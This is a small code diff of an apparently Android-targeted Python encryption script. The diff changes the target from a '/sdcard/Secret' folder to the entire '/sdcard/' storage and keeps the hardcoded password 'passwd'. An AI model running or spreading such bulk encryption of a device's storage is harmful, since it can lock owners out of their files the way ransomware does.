@@ -36,7 +36,7 @@ def encrypt_directory(directory: str, password: str) -> None:
         salt_file.write(salt)
 
 if __name__ == "__main__":
-    directory = '/sdcard/Secret'
+    directory = '/sdcard/'
     password = 'passwd'
     encrypt_directory(directory, password)
     print("Criptografia concluída.")
